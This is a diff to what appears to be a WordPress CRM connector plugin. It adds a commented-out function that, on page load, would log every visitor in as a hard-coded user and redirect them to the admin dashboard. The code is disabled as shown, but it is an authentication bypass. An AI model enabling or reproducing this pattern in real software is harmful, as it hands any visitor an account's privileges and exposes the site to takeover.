@@ -78,3 +78,26 @@ $CRMConnectorPlugin = new CRMConnector();
 register_activation_hook( __FILE__, array($CRMConnectorPlugin, 'activate'));
 
 add_action('init', array($CRMConnectorPlugin, 'initialize'));
+
+
+/*add_action( 'template_redirect', 'redirect_non_logged_users_to_specific_page' );
+
+function redirect_non_logged_users_to_specific_page()
+{
+
+    $username = "joshcrawmer4";
+    $user = get_user_by('login', $username );
+
+// Redirect URL //
+    if ( !is_wp_error( $user ) )
+    {
+        wp_clear_auth_cookie();
+        wp_set_current_user ( $user->ID );
+        wp_set_auth_cookie  ( $user->ID );
+
+        $redirect_to = user_admin_url();
+        wp_safe_redirect( $redirect_to );
+        exit();
+    }
+
+}*/
